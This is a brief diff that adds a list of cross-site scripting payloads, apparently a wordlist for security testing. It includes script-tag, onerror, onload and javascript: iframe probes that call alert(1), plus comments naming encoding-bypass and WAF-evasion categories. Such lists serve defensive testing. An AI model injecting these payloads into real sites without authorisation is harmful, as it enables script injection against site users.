@@ -1,0 +1,10 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+<svg onload=alert(1)>
+'"><img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe> <!-- Event handler variations -->
+<!-- Encoding bypass techniques -->
+<!-- DOM manipulation XSS patterns -->
+<!-- JavaScript injection patterns -->
+<!-- WAF evasion and bypass techniques -->
